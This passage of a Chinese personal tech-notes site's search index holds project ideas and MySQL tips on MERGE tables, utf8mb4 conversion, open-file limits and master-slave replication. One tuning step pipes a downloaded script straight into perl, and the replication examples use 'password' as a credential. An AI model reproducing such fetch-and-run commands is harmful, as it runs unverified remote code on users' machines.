https\uff0c\u8bbf\u95ee https</p> <p>misc\uff1a\u751f\u6210 url \u957f\u5ea6\uff0c\u662f\u5426\u9650\u5236\u56fd\u5916\u8bbf\u95ee\uff0ccdn \u8282\u70b9\u5e7f\u5ea6\uff0c\u662f\u5426\u88ab\u5899</p>"},{"location":"Misson/#deny404","title":"Deny404","text":"<p>360\u6781\u901f\u6d4f\u89c8\u5668\u66fe\u7ecf\u6709\u7684\u7f51\u9875\u5feb\u7167\u529f\u80fd\uff0c\u80fd\u4e0d\u80fd\u7528Chrome\u6269\u5c55\u5b9e\u73b0</p> <p>\u8981\u6c42\u5728\u4e0d\u5f15\u7528\u4efb\u4f55\u5916\u90e8\u8d44\u6e90\u7684\u60c5\u51b5\u4e0b\u5c55\u793a\u51fa\u548c\u539f\u7f51\u9875\u57fa\u672c\u76f8\u540c\u7684\u6548\u679c</p> <p>\u751f\u6210\u6587\u4ef6\u5c3d\u91cf\u5c11\uff0c\u80fdpush\u5230github</p> <p>\u53e6\u5916\u4e5f\u9700\u8981\u5168\u6587\u68c0\u7d22</p> <p>\u5165\u624b\uff1a\u8003\u8651\u590d\u5236\u7f51\u9875\u6587\u672c+cutycapt\u4fdd\u5b58\u56fe\u7247</p> <p>\u76ee\u524d\u7684\u5b9e\u73b0\uff1a\u5370\u8c61\u7b14\u8bb0/Evernote\u7684\u526a\u85cf\u63d2\u4ef6\uff0c\u7136\u540e\u7528api\u5bfc\u51fa \u53c2\u89c1evernote2ipfs</p>"},{"location":"Misson/#easycrawler","title":"EasyCrawler","text":"<p>\u7ed9\u51fa\u4e24\u4e09\u4e2a\u7f51\u9875url\uff0c\u81ea\u52a8diff\u5206\u6790\u7f51\u9875\u5185\u5bb9\u6240\u5728\u7684tag\uff0c\u5f97\u51fa\u4eceurl\u2192\u5185\u5bb9\u7684\u7b97\u6cd5</p> <p>\u751a\u81f3\u7ed9\u51fa\u7f51\u7ad9\u57df\u540d\u76f4\u63a5\u722c\u53d6\u5168\u7ad9\u5e76\u63d0\u53d6\u5185\u5bb9\u5230\u6570\u636e\u5e93\u4ee5\u4fbf\u538b\u7f29\u5b58\u50a8</p> <p>\u5165\u624b\uff1a\u4e5f\u8bb8\u9700\u8981\u4e86\u89e3lxml</p>"},{"location":"Misson/#waf","title":"WAF","text":"<p>\u5f00\u6e90\u7684WAF? </p>"},{"location":"Misson/#_3","title":"\u6587\u4ef6\u6574\u7406","text":"<p>\u6709\u4e86Everything\u627e\u6587\u4ef6\u65b9\u4fbf\u4e86\u4e00\u70b9</p> <p>windows\u4e0b\u6709\u6ca1\u6709\u5bf9\u6587\u4ef6\u8fdb\u884c\u6807\u8bb0\u5173\u952e\u8bcd\u3001\u673a\u5bc6\u7b49\u7ea7\u7684explorer\u7684\u6269\u5c55\u5462\u3002\u3002\u3002</p> <p>\u673a\u5bc6\u6587\u4ef6\u8981\u81ea\u52a8\u52a0\u5bc6\uff0c\u9700\u8981google authenticator\u4e24\u6b65\u9a8c\u8bc1\u89e3\u5bc6</p> <p>\u91cd\u8981\u6587\u4ef6\u9700\u8981\u81ea\u52a8\u5f02\u5730\u5907\u4efd\uff0c\u5e76\u63d0\u9192\u4f7f\u7528\u79fb\u52a8\u786c\u76d8\u79bb\u7ebf\u5907\u4efd+\u63d2\u5165\u786c\u76d8\u540e\u81ea\u52a8\u5907\u4efd\u9700\u8981\u5907\u4efd\u7684\u4e1c\u897f</p> <p>\u6709\u6ca1\u6709Explorer\u53f3\u952e\u6269\u5c55\u5bf9\u6587\u4ef6\u8fdb\u884c\u6807\u8bb0tag\u7684\u5de5\u5177\uff1f</p> <p>\u6807\u8bb0\u4e3a\u91cd\u8981\u7684\u6587\u4ef6\u81ea\u52a8\u91c7\u7528\u591a\u79cd\u5b58\u50a8\u65b9\u6848\u8fdb\u884c\u5907\u4efd+\u7248\u672c\u63a7\u5236\uff0c\u652f\u6301\u81ea\u5df1\u5916\u63a5\u786c\u76d8\uff08\u63d0\u9192\uff09\u3001\u4e0a\u4f20\u5230\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>\u4e0d\u53ef\u9760\uff1a\u81ea\u5df1\u7684\u786c\u76d8\u3001\u767e\u5ea6\u7f51\u76d8</li> <li>\u514d\u8d39\u7684\u4e91\u76d8\u670d\u52a1\uff1a\u5929\u7ffc\u4e91\u76d8\u3001\u575a\u679c\u4e91\u3001\u4ebf\u65b9\u4e91\u3001\u5976\u725b\u5feb\u4f20\u3001\u6d59\u5927\u4e91\u76d8</li> <li>\u81ea\u5efa\u7684\u4e91\u4e0a\u5b58\u50a8\uff1a\u81ea\u5df1\u670d\u52a1\u5668(Seafile)\u3001Google Drive\u3001OneDrive</li> <li>\u5546\u4e1a\u5316\u7684\u5bf9\u8c61\u5b58\u50a8\uff1a\u963f\u91ccOSS\u3001\u817e\u8baf\u4e91COS\u3001\u53c8\u62cd\u4e91\u3001\u4e03\u725b\u3001AWS S3\u3001\u767e\u5ea6\u4e91</li> <li>\u4e5f\u80fd\u5b58\u4f46\u4e0d\u9002\u5408\uff1a\u90ae\u4ef6\u9644\u4ef6\u3001Github\u3001\u5370\u8c61\u7b14\u8bb0</li> </ul> <p>\u5907\u4efd\u7684\u540c\u65f6\u8981\u652f\u6301\u6587\u4ef6\u52a0\u5bc6\u5b58\u50a8</p> <p>\u6807\u8bb0\u4e3a\u5de5\u4f5c\u6587\u4ef6\u8981\u652f\u6301\u624b\u673a\u7aef\u8bbf\u95ee</p> <p>\u7528\u6237\u53ea\u8981\u9f20\u6807\u53f3\u952e\u70b9\u4e00\u70b9\uff0c\u540e\u53f0\u81ea\u52a8\u5904\u7406\u52a0\u5bc6\u3001\u4f20\u8f93\u7684\u95ee\u9898\uff0c\u5e76\u8003\u8651\u5355\u4e00\u670d\u52a1\u4e0d\u518d\u53ef\u7528\u7684\u98ce\u9669</p> <p>\u55ef\u3002\u3002\u3002\u65e2\u8981\u7ecf\u6d4e\u53c8\u8981\u53ef\u9760\u4f3c\u4e4e\u5f88\u9ebb\u70e623333\uff1f</p>"},{"location":"Misson/#_4","title":"\u4e00\u7ad9\u5f0f\u83b7\u53d6\u6240\u6709\u6211\u5e94\u8be5\u77e5\u9053\u7684\u4fe1\u606f","text":"<p>\u4e5f\u8bb8\u5c31\u662f\u5982\u4f55\u63a8\u9001\u5230\u65e5\u5386\u5427\u3002\u3002\u3002win10\u6709\u6ca1\u6709\u53ef\u7f16\u7a0b\u7684\u684c\u9762\u5c0f\u90e8\u4ef6\u5462\u3002\u3002\u3002</p> <p>\u6709\u6ca1\u6709\u4e00\u4e2a\u5c4f\u5e55\u76f4\u63a5\u663e\u793a\u6211\u6240\u7ba1\u7406\u7684\u6240\u6709\u670d\u52a1\u5668\u7684\u72b6\u6001\u7684\u7a0b\u5e8f\u5462\u3002\u3002\u3002</p> <p>\u4e5f\u9700\u8981\u722c\u866b\u722c\u4e00\u4e0b\u9662\u7f51</p> <p>\u91cd\u8981\u7684\u63d0\u9192\u53d1\u4e2a\u90ae\u4ef6\u901a\u77e5\u81ea\u5df1</p>"},{"location":"Misson/#apifinished","title":"\u57fa\u4e8e\u6d59\u5927\u4e91\u76d8\u505a\u51fa\u4e0a\u4f20\u5206\u4eabAPI[Finished]","text":"<p>\u672cidea\u5df2\u7ecf\u5b9e\u73b0\uff1ahttps://github.com/zjuchenyuan/EasyLogin/tree/master/examples/fangcloud</p> <p>\u6bcf\u4e2a\u4eba2T\u7684\u5b58\u50a8\u7a7a\u95f4\u600e\u4e48\u80fd\u9519\u8fc7\u3002\u3002\u3002</p> <p>\u4e0d\u8fc7\u4ebf\u65b9\u4e91\u8fd8\u6ca1\u6709\u7ed9\u6d59\u5927\u4e91\u76d8\u641e\u5ba2\u6237\u7aef\uff0c\u4e0a\u4f20\u6709\u70b9\u70e6</p> <p>\u7814\u7a76\u4e00\u4e0b\u5982\u4f55\u4eceteam.zju.edu.cn\u5f00\u59cb\u767b\u5f55\u4e0a\u4f20\u5206\u4eab\u4e0b\u8f7d\u4e00\u6761\u9f99\u7684API\u5b9e\u73b0</p>"},{"location":"Misson/#upyun-https-finished","title":"upyun https \u8bc1\u4e66\u66f4\u65b0[Finished]","text":"<p>\u81ea\u52a8\u5316\u66f4\u65b0\u8bc1\u4e66 \u907f\u514d\u624b\u52a8\u590d\u5236\u7c98\u8d34</p> <p>https://github.com/zjuchenyuan/EasyLogin/blob/master/examples/upyun/upyun.py</p>"},{"location":"MySQL/","title":"MySQL","text":""},{"location":"MySQL/#_1","title":"\u67e5\u770b\u8868\u7ed3\u6784","text":"<p>desc \u8868\u540d\u79f0;</p>"},{"location":"MySQL/#sql","title":"\u67e5\u770b\u5efa\u8868sql\u8bed\u53e5","text":"<pre><code>show create table \u8868\u540d\u79f0;\n</code></pre>"},{"location":"MySQL/#merge","title":"MERGE\u5b58\u50a8\u5f15\u64ce","text":"<p>\u5b98\u65b9\u6587\u6863\uff1ahttp://dev.mysql.com/doc/refman/5.7/en/merge-storage-engine.html</p> <p>\u67e5\u770b\u80fd\u7528\u7684\u5f15\u64ce\uff1ashow engines</p>"},{"location":"MySQL/#merge_1","title":"\u521b\u5efa\u4e00\u4e2aMERGE\u8868\uff1a","text":"<p>\u5047\u8bbe\u6709a,b\u8868\uff0c\u4ed6\u4eec\u7684\u7ed3\u6784\u5b8c\u5168\u76f8\u540c\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2ac\u8868\uff0c\u6ce8\u610f\u8fd9\u4e2a\u8868\u7684\u5b9a\u4e49\u8981\u4e0ea\u548cb\u8868\u5b8c\u5168\u4e00\u81f4</p> <pre><code>drop table if exists data;\nCREATE TABLE c (\n`id` int(11) NOT NULL,\n`data` longtext NOT NULL,\nPRIMARY KEY (`id`)\n) ENGINE= MRG_MYISAM ,UNION=(a,b);\n</code></pre> <p>\u7279\u70b9\uff1a</p> <p>\u8fd9\u79cd\u8868\u4e0d\u4f1a\u521b\u5efa\u989d\u5916\u7684\u7d22\u5f15\uff0c\u4f46\u67e5\u8be2\u8d77\u6765\u6bd4\u89c6\u56fe\u901f\u5ea6\u66f4\u5feb\uff1b</p> <p>\u4e0d\u80fd\u5728\u8fd9\u79cd\u8868\u4e0a\u5efa\u7acb\u5168\u6587\u7d22\u5f15</p>"},{"location":"MySQL/#_2","title":"\u5220\u9664\u8868\u7684\u5197\u4f59","text":"<p>\u4e24\u884c\u53ea\u6709\u4e00\u5217(\u8fd9\u91cc\u5047\u8bbe\u4e3a gettime )\u4e0d\u540c\uff0c\u5220\u9664\u5176\u4e2d\u4e00\u884c</p> <pre><code>delete t1 from t as t1, t as t2 where\nt1.id = t2.id and\nt1.\u5176\u4ed6\u5217=t2.\u5176\u4ed6\u5217 and\nt1.gettime&gt;t2.gettime;\n</code></pre>"},{"location":"MySQL/#alter-table","title":"\u4fee\u6539\u8868 alter table","text":"<pre><code>ALTER IGNORE TABLE `\u8868\u540d\u79f0`\nMODIFY COLUMN `id`  int(11) NOT NULL FIRST,\nMODIFY COLUMN `user` varchar(66) NOT NULL AFTER `id`,\nMODIFY COLUMN `content` longtext NOT NULL AFTER `user`,\nDROP PRIMARY KEY,\nADD PRIMARY KEY (`id`),\nDROP INDEX `a1`,\nADD INDEX `a1` (`user`);\n</code></pre>"},{"location":"MySQL/#_3","title":"\u5c06\u4e2d\u6587\u8f6c\u4e3a\u62fc\u97f3 \u51fd\u6570","text":"<p>\u4ee3\u7801\u5728code/pinyin.sql</p>"},{"location":"MySQL/#url","title":"\u4ece\u8def\u5f84URL\u83b7\u53d6\u6587\u4ef6\u540d\u79f0","text":"<p>\u6765\u6e90 http://stackoverflow.com/questions/17090237/extracting-filenames-from-a-path-mysql</p> <p>\u4f7f\u7528SUBSTRING_INDEX\u51fd\u6570\uff0c\u5047\u8bbeurl\u6b64\u884c\u7684\u5185\u5bb9\u4e3a\u201dhttp://example.com/some/path/to/filename.zip\u201d</p> <pre><code>select SUBSTRING_INDEX(url, '/', -1) as filename;\n</code></pre> <p>\u5373\u53ef\u5f97\u5230\u4e00\u5217filename\uff0c\u6b64\u884c\u6570\u636e\u4e3a\u201dfilename.zip\u201d</p>"},{"location":"MySQL/#_4","title":"\u67e5\u8be2\u4f18\u5316","text":""},{"location":"MySQL/#explainusing-filesort","title":"explain\u53d1\u73b0\u51fa\u73b0\u4e86using filesort","text":"<p>\u53c2\u8003 http://www.ccvita.com/169.html</p> <p>\u5982\u679c\u4f7f\u7528\u4e86order by\u6216\u8005group by\uff0c\u9700\u8981\u5efa\u7d22\u5f15\u4ee5\u4f18\u5316\u8fd9\u4e2a\u67e5\u8be2</p> <p>group by\u7528\u4e86\u4e24\u4e2a\u5217\uff0c\u4e24\u5217\u8981\u5408\u5728\u4e00\u8d77\u521b\u5efa\u7d22\u5f15</p>"},{"location":"MySQL/#_5","title":"\u5185\u5b58\u8868\u7d22\u5f15\u7684\u9009\u62e9","text":"<p>\u53c2\u8003 https://dev.mysql.com/doc/refman/5.5/en/optimizing-memory-tables.html</p> <p>\u5185\u5b58\u8868\u7684\u7d22\u5f15\u5e94\u8be5\u9009\u62e9BTREE</p>"},{"location":"MySQL/#the-table-is-full","title":"\u5185\u5b58\u8868The table is full","text":"<p>\u4fee\u6539MySQL\u7684\u914d\u7f6e\u6587\u4ef6/etc/mysql/my.cnf\uff0c\u5728[mysqld]\u4e0b\u6dfb\u52a0/\u4fee\u6539\u4e24\u884c(\u4e0b\u9762\u7684\u503c\u4ec5\u4f9b\u53c2\u8003,\u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u914c\u60c5\u5904\u7406)\uff1a </p> <pre><code>tmp_table_size = 256M // \u4e34\u65f6\u8868\u5927\u5c0f \nmax_heap_table_size = 256M // \u5185\u5b58\u8868\u5927\u5c0f \n</code></pre>"},{"location":"MySQL/#replace","title":"replace\u51fd\u6570\u66ff\u6362\u6587\u672c","text":"<pre><code>update `content` set value=replace(value,\"original content\",\"replaced content\");\n</code></pre> <p>\u6ce8\u610freplace\u4e0d\u8981\u53cd\u5f15\u53f7</p>"},{"location":"MySQL/#split","title":"\u7b80\u5355\u7684split\u529f\u80fd\uff0c\u6587\u672c\u8f6c\u6570\u5b57","text":"<p>\u8868\u7684\u8bbe\u8ba1\u8fdd\u80cc\u4e86\u4e00\u5217\u53ea\u5b58\u653e\u4e00\u79cd\u6570\u636e\u7684\u539f\u5219\uff0c\u641e\u51fa\u4e86\u8fd9\u6837\u4e00\u4e2aText\u7c7b\u578b\u7684\u5217(\u5047\u8bbe\u4e3ainfo)\uff0c\u683c\u5f0f\u4e3a\u201d\u7528\u6237\u540d: \u6570\u503c\u201d</p> <p>\u73b0\u5728\u9700\u8981\u5c06\u6570\u503c\u4ece\u8fd9\u4e00\u5217\u4e2d\u63d0\u53d6\u51fa\u6765\uff0c\u5e76\u8f6c\u4e3aint\u7c7b\u578b</p> <pre><code>convert (\nsubstr(\n`info`,\nlocate(':', `info`) + 2\n),\nunsigned integer\n)\n</code></pre> <p>Google\u5173\u952e\u8bcd\uff1a<code>mysql split string</code>,<code>mysql string to int</code></p> <p>\u53c2\u8003\uff1a</p> <p>https://stackoverflow.com/questions/14950466/how-to-split-the-name-string-in-mysql</p> <p>https://stackoverflow.com/questions/5960620/convert-text-into-number-in-mysql-query</p>"},{"location":"MySQL/#mysqld","title":"mysqld\u914d\u7f6e\u53c2\u6570\u8c03\u4f18","text":"<p>\u53c2\u8003\uff1ahttps://www.linode.com/docs/databases/mysql/how-to-optimize-mysql-performance-using-mysqltuner</p> <p>\u4f7f\u7528MySQLTuner\u8fd9\u4e2a\u5de5\u5177\u5f97\u5230\u4e00\u4e9b\u5efa\u8bae\uff1a</p> <pre><code>curl -L http://mysqltuner.pl/ | perl\n</code></pre> <p>\u5bf9\u4e8e\u5176\u6700\u540e\u7ed9\u51fa\u7684\u53c2\u6570\u5efa\u8bae\u7167\u505a\u5373\u53ef\u3002</p> <p><code>key_buffer</code>\u53c2\u6570\u662f\u6700\u5173\u952e\u7684\u53c2\u6570\uff0c\u51b3\u5b9a\u4e86mysql\u5360\u7528\u7684\u5185\u5b58\u5927\u5c0f</p>"},{"location":"MySQL/#emojiutf8utf8mb4","title":"\u652f\u6301emoji\uff0c\u4eceutf8\u5347\u7ea7\u5230utf8mb4","text":"<p>\u4e3a\u4e86\u8ba9mysql\u5b58\u50a8emoji\u8868\u60c5\uff0c\u9700\u8981\u8fdb\u884c\u8868\u7684\u53d8\u66f4\u64cd\u4f5c \u4ee5\u53ca \u8fde\u63a5\u4ee3\u7801\u7684\u4fee\u6539</p> <p>\u53c2\u8003https://stackoverflow.com/questions/26532722/how-to-encode-utf8mb4-in-python</p>"},{"location":"MySQL/#charvarchartextutf8mb4","title":"\u8868\u7684\u53d8\u66f4 \u8868\u7684\u6bcf\u4e00\u4e2a<code>CHAR</code>\uff0c<code>VARCHAR</code>\u548c<code>TEXT</code>\u7c7b\u578b\u7684\u5217\u90fd\u8981\u6539\u4e3a\u4f7f\u7528utf8mb4","text":"<p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u8868\u540d\u79f0{tablename}\uff0c\u4fee\u6539\u5176<code>user</code>\u5217\u548c<code>content</code>\u5217\uff0c\u4ee5\u53ca\u8868\u7684\u9ed8\u8ba4\u5b57\u7b26\u96c6\uff1a</p> <pre><code>ALTER TABLE `{tablename}`\nMODIFY COLUMN `user`  varchar(66) CHARACTER SET utf8mb4 NOT NULL AFTER `edittime`,\nMODIFY COLUMN `content`  longtext CHARACTER SET utf8mb4 NOT NULL AFTER `user`,\nDEFAULT CHARACTER SET=utf8mb4;\n</code></pre>"},{"location":"MySQL/#_6","title":"\u8fde\u63a5\u4ee3\u7801\u7684\u6539\u52a8","text":"<p>\u5728\u6267\u884c insert \u7684 sql\u8bed\u53e5\u4e4b\u524d\uff0c\u5148\u6267\u884c\u8fd9\u4e09\u6761sql:</p> <pre><code>SET NAMES utf8mb4;\nSET CHARACTER SET utf8mb4; \nSET character_set_connection=utf8mb4;\n</code></pre>"},{"location":"MySQL/#too-many-open-files","title":"\u89e3\u51b3 Too many open files \u9519\u8bef","text":"<p>\u53c2\u8003\uff1ahttps://duntuk.com/how-raise-ulimit-open-files-and-mysql-openfileslimit</p> <p>https://stackoverflow.com/questions/22495124/cannot-set-limit-of-mysql-open-files-limit-from-1024-to-65535/35515570</p> <p>\u7cfb\u7edf\u73af\u5883\uff1a ubuntu16.04\uff0c\u7528apt install mysql-server\u5b89\u88c5\u7684mysql</p> <p>\u8fd9\u4e2a\u95ee\u9898\u7684\u539f\u56e0\u662fmysql\u9ed8\u8ba4\u7684open_files_limit\u662f1024\uff0c\u5728mysql\u6253\u5f001024\u4e2a\u6587\u4ef6\u540e\u5c31\u65e0\u6cd5\u518d\u6253\u5f00\u65b0\u6587\u4ef6\uff0c\u9700\u8981\u4fee\u6539\u8fd9\u4e2alimit\uff0c\u5982\u6539\u4e3a1024000</p> <p>\u4fee\u6539<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code>\uff0c\u5728[mysqld_safe]\u548c[mysqld]\u90fd\u52a0\u5165\u4e00\u884c\uff1a</p> <pre><code>open_files_limit = 1024000\n</code></pre> <p>\u5728<code>/etc/security/limits.conf</code>\u4e2d\u52a0\u5165\uff1a</p> <pre><code>* soft nofile 1024000\n* hard nofile 1024000\n* soft nproc 10240\n* hard nproc 10240\n</code></pre> <p>\u4e0a\u8ff0\u8fd8\u4e0d\u591f\uff0c\u7531\u4e8emysql\u670d\u52a1\u88absystemd\u7ba1\u7406\uff0c\u8fd8\u8981\u4fee\u6539<code>/lib/systemd/system/mysql.service</code>\uff0c\u5728\u6700\u540e\u52a0\u5165</p> <pre><code>LimitNOFILE = infinity\nLimitMEMLOCK = infinity\n</code></pre> <p>\u5728ubuntu16.04\u4e0a\uff0c\u8fd9\u4e9b\u8fd8\u4e0d\u591f\uff0c\u8fd8\u8981\u7ee7\u7eed\u6539systemd: \uff08\u53c2\u8003\uff1ahttps://serverfault.com/questions/791729/ubuntu-16-04-server-mysql-open-file-limit-wont-go-higher-than-65536\uff09</p> <pre><code>mkdir /etc/systemd/system/mysql.service.d\ntee /etc/systemd/system/mysql.service.d/override.conf &lt;&lt;-'EOF'\n[Service]\nLimitNOFILE=1024000\nEOF\n</code></pre> <p>\u7136\u540e\u91cd\u542fmysql\uff1a</p> <pre><code>systemctl daemon-reload\nsystemctl restart mysql.service\n</code></pre> <p>\u4f7f\u7528\u8fd9\u4e24\u79cd\u65b9\u6cd5\u90fd\u80fd\u770b\u5230\u4fee\u6539\u662f\u5426\u751f\u6548\uff1a</p> <pre><code>ps aux|grep mysqld #\u627e\u5230mysqld\u7684\u8fdb\u7a0bID\ncat /proc/\u4e0a\u8ff0\u627e\u5230\u7684\u8fdb\u7a0bID/limits | grep files\n\nmysql -u root -p\nshow global variables like \"%open_files_limit%\";\n</code></pre>"},{"location":"MySQL/#ubuntu1604mysqlapt-upgrade","title":"\u89e3\u51b3ubuntu16.04\u4e0amysql\u88abapt upgrade\u81ea\u52a8\u5173\u95ed\u7684\u95ee\u9898","text":"<p>\u95ee\u9898\u73b0\u8c61\uff1a mysql\u670d\u52a1\u81ea\u52a8\u9000\u51fa\uff0c\u67e5\u65e5\u5fd7<code>jounralctl -xe|tac|less</code>\u53d1\u73b0\u662f<code>apt upgrade</code>\u5f15\u8d77\u7684\u81ea\u52a8\u9000\u51fa</p> <p>\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2aubuntu16.04\u7684\u7279\u6027\uff0c\u6bcf\u5929\u51cc\u66686\u70b9\u4f1a\u81ea\u52a8apt upgrade\u5b89\u5168\u66f4\u65b0\uff0c\u4f46\u4e0d\u660e\u539f\u56e0\u8fd9\u4e2a\u66f4\u65b0\u5931\u8d25\u4e86\uff0capt\u5173\u6389\u4e86mysql\u670d\u52a1\u540e\u7531\u4e8e\u5f02\u5e38\u9000\u51fa\u5e76\u6ca1\u6709\u91cd\u65b0\u628amysql\u670d\u52a1\u542f\u52a8</p> <p>\u5982\u679c\u4f60\u60f3\u5173\u6389\u81ea\u52a8\u66f4\u65b0\uff08\u4e0d\u5efa\u8bae\uff09\uff1a\u4fee\u6539<code>/etc/apt/apt.conf.d/20auto-upgrades</code>\uff0c\u6539\u4e3a<code>APT::Periodic::Unattended-Upgrade \"0\";</code></p> <p>\u6267\u884c<code>apt upgrade</code>\u6216\u8005<code>apt-get install -f</code>\u770b\u770b\uff0c\u80fd\u91cd\u73b0\u95ee\u9898\uff08mysql\u88ab\u5173\u6389\u4e86\uff09\uff0c\u4e5f\u53d1\u73b0\u4e86\u62a5\u9519\u4fe1\u606f\uff1a</p> <pre><code>mysql_upgrade: Got error: 2002: Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2) while connecting to the MySQL server\nUpgrade process encountered error and will not continue.\n</code></pre> <p>\u7136\u540e\u5c31\u67e5\u8fd9\u4e2a\u62a5\u9519\uff0c\u53d1\u73b0\u4e86\u8fd9\u4e2a\uff1ahttps://github.com/chef-cookbooks/mysql/issues/466</p> <p>\u4eba\u5bb6\u7684\u89e3\u51b3\u65b9\u6848\u662f\uff1a<code>systemctl enable mysql</code>\uff0c\u7136\u800c\u6211\u6267\u884c\u53c8\u9047\u5230\u4e86systemd\u7684\u62a5\u9519\uff1a<code>Failed to execute operation: Invalid argument</code></p> <p>\u6700\u7ec8\u89e3\u51b3\u65b9\u6848\u5c31\u662f\u5148disable\u4e00\u4e0b</p> <pre><code>systemctl disable mysql\nsystemctl enable mysql\napt-get install -f\n</code></pre>"},{"location":"MySQL/#null0","title":"NULL\u8f6c0","text":"<p>\u7528\u51fd\u6570IFNULL\uff0c\u5199\u6cd5\u5c31\u662f<code>IFNULL(\u5217\u540d, 0)</code></p> <p>\u4e3e\u4e2a\u4f8b\u5b50</p> <pre><code>select sum(IFNULL(score, 0)) from runs;\n</code></pre>"},{"location":"MySQL/#mysqlslave","title":"\u7ed9MySQL\u589e\u52a0\u4e00\u4e2aslave\u505a\u4e3b\u4ece\u590d\u5236","text":"<p>master\u542f\u7528binlog\u914d\u7f6eserver-id\uff1bmaster\u7528mysqldump\u5bfc\u51fa\u6570\u636e\u5e93\uff1bslave\u5bfc\u5165\uff0c\u5f00\u59cbslave</p>"},{"location":"MySQL/#master","title":"master\u521b\u5efa\u7528\u6237","text":"<pre><code>GRANT REPLICATION SLAVE ON *.* TO 'slave_user'@'%' IDENTIFIED BY 'password';\nFLUSH PRIVILEGES;\n</code></pre>"},{"location":"MySQL/#masterbinlog","title":"master\u542f\u7528binlog","text":"<p>/etc/mysql/conf.d/master.cnf</p> <pre><code>[mysqld]\nserver-id=1\nlog-bin=mysql-bin.log\ninnodb_flush_log_at_trx_commit=1\nsync_binlog=1\n</code></pre>"},{"location":"MySQL/#_7","title":"\u642c\u8fd0\u6570\u636e\u5e93","text":"<p>\u7531\u4e8ebinlog\u662f\u5728\u5df2\u7ecf\u6709\u6570\u636e\u4e4b\u540e\u624d\u5f00\u542f\u7684\uff0c\u800cmysql\u4e0d\u4f1a\u81ea\u5df1\u6267\u884c\u5168\u91cf\u540c\u6b65\uff0c\u5c31\u53ea\u80fd\u9760\u624b\u5de5\u642c\u8fd0sql\u6587\u4ef6\u54af</p> <p>\u8de8\u5730\u57df\u590d\u5236\u7f51\u901f\u662f\u9650\u5236\u56e0\u7d20\uff0c\u5c31\u75287z\u538b\u7f29\u4e86</p> <pre><code>mysqldump -h 127.0.0.1 -P 3306 -u root -p --opt --single-transaction --comments --hex-blob --dump-date --no-autocommit --all-databases --master-data | 7z a -si dbdump.sql.7z\n7z x -so dbdump.sql.7z | mysql -h 127.0.0.1 -u root -p\n</code></pre> <p>\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528ssh\u548c\u7ba1\u9053\u64cd\u4f5c\uff0c\u5c31\u4e0d\u7528\u521b\u5efa\u6587\u4ef6\u4e86\uff1a</p> <pre><code>ssh master_server \"mysqldump -h 127.0.0.1 -P 3306 -u root -ppassword --opt --single-transaction --comments --hex-blob --dump-date --no-autocommit --all-databases --master-data |gzip\" | zcat | mysql -h 127.0.0.1 -u root -ppassword\n</code></pre> <p>\u5176\u4e2d<code>--master-data</code>\u5f88\u91cd\u8981\uff0c\u5bfc\u51fa\u7684\u65f6\u5019\u5c31\u81ea\u52a8\u5e26\u4e0a\u4e86master\u7684\u4fe1\u606f\uff0c\u65e0\u9700\u518d\u624b\u5de5\u8bb0\u5f55</p> <p><code>CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000002', MASTER_LOG_POS=15410;</code></p>"},{"location":"MySQL/#slave","title":"\u914d\u7f6eslave","text":"<p>\u5b9e\u9645\u4f7f\u7528\u4e2d\u5f88\u5bb9\u6613\u9047\u5230duplicate key\u7684\u95ee\u9898\uff0c\u5bfc\u81f4slave\u7ebf\u7a0b\u505c\u4f4f\uff0c\u914d\u7f6e\u76f4\u63a5\u5ffd\u7565\u8fd9\u4e2a\u9519\u8bef \u53c2\u8003</p> <pre><code>server-id               = 2\nrelay-log               = mysql-relay-bin.log\nlog_bin                 = mysql-bin.log\nslave-skip-errors = 1062\n</code></pre> <pre><code>CHANGE MASTER TO MASTER_HOST='12.34.56.789',MASTER_USER='slave_user', MASTER_PASSWORD='password';\nSTART SLAVE;\nSHOW SLAVE STATUS\\G\n</code></pre>"},{"location":"MySQL/#docker","title":"Docker\u955c\u50cf","text":"<p>https://github.com/bitnami/bitnami-docker-mysql</p> <p>\u4f46\u8fd9\u4e2a\u955c\u50cf\u4e5f\u4e0d\u4f1a\u5e2e\u4f60\u81ea\u52a8\u5b8c\u6210mysqldump\uff0c\u4f46\u914d\u7f6e\u4e00\u4e2aslave\u8fd8\u662f\u5f88\u7701\u5fc3\u7684</p> <p>\u6ce8\u610f\u6743\u9650\u914d\u7f6e\uff0c\u5982\u679c\u539f\u672c\u6570\u636e\u6587\u4ef6\u5939\u4e0d\u5b58\u5728\uff0cDocker\u521b\u5efa\u7684\u662froot\u7528\u6237\u624d\u80fd\u8bfb\u5199\uff0c\u5bfc\u81f4\u5bb9\u5668\u76f4\u63a5\u9000\u51fa\uff0c\u5751\u7684\u5730\u65b9\u5728\u4e8e\u6ca1\u6709\u62a5\u9519\u4fe1\u606f</p> <pre><code>mkdir -p /srv/mysql-slave/data\nchown 1001 /srv/mysql-slave/data -R\n\ndocker run -it -v /srv/mysql-slave/my.cnf:/opt/bitnami/mysql/conf/my.cnf:ro -v /srv/mysql-slave/data:/bitnami/mysql/data \\\n     --name mysql-slave -e MYSQL_REPLICATION_MODE=slave -e MYSQL_REPLICATION_USER=slave_user -e MYSQL_REPLICATION_PASSWORD=password \\\n      -e MYSQL_MASTER_HOST=12.34.56.789 -e MYSQL_MASTER_PORT_NUMBER=3306 \\\n      -e MYSQL_MASTER_ROOT_USER=slave_user -e MYSQL_MASTER_ROOT_PASSWORD=password \\\n      bitnami/mysql:5.7\n</code></pre> <p>\u5176\u4e2dMYSQL_MASTER_ROOT_USER\u867d\u7136\u4eba\u5bb6\u8bf4\u8981root\u7528\u6237\uff0c\u5b9e\u9645\u4e0a\u4ee3\u7801\u91cc\u53ea\u662f\u7528\u6765select 1\uff0c\u6240\u4ee5\u7528slave_user\u5373\u53ef\uff0c\u53c2\u89c1\u6211\u63d0\u7684issue</p> <p>\u5bb9\u5668\u542f\u52a8\u540e\u4e00\u822c\u4f1a\u7531\u4e8emaster\u7684binlog\u4e0d\u5b8c\u6574\u6267\u884csql\u5931\u8d25\uff08\u8868\u4e0d\u5b58\u5728\uff09\uff0c\u9700\u8981\u7ee7\u7eed\u64cd\u4f5c\uff1a</p> 